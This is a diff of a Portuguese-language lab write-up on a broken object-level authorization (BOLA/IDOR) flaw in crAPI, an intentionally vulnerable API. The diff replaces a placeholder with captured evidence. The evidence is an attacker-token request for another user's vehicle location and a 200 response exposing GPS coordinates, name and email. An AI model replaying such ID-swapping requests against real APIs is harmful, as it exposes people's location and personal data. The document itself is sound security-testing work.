@@ -29,11 +29,22 @@ Authorization: Bearer <token_do_atacante>
 
 Se a API retornar as coordenadas do veículo da vítima, a autorização por objeto está quebrada.
 
-> **Confirmar na instância:** o path exato (`/identity/api/v2/vehicle/{id}/location`) deve ser validado observando o tráfego real ao visualizar o próprio veículo na interface e trocando o ID.
-
 ## 4. Evidência
 
-> _A preencher após execução contra o crAPI._ Print salvo em `evidencias/01-bola/`. A evidência deve mostrar duas requisições lado a lado: (a) atacante consultando o próprio veículo e (b) o mesmo atacante consultando o `vehicleId` da vítima e recebendo **200 OK** com dados que não são dele.
+**Confirmado contra a instância local** — captura em [`evidencias/01-bola/captura.txt`](../../evidencias/01-bola/captura.txt).
+
+Usando o token do **atacante** sobre o `vehicleId` de outro usuário (obtido via [Excessive Data Exposure](03-excessive-data-exposure.md)):
+
+```
+GET /identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location
+Authorization: Bearer <token_do_atacante>
+
+HTTP 200
+{"carId":"f89b5f21-...","vehicleLocation":{"latitude":"32.778889","longitude":"-91.919243"},
+ "fullName":"Adam","email":"adam007@example.com"}
+```
+
+A API retornou a **localização GPS, o nome e o e-mail** de um veículo que não pertence ao atacante.
 
 ## 5. Por que é um risco
 
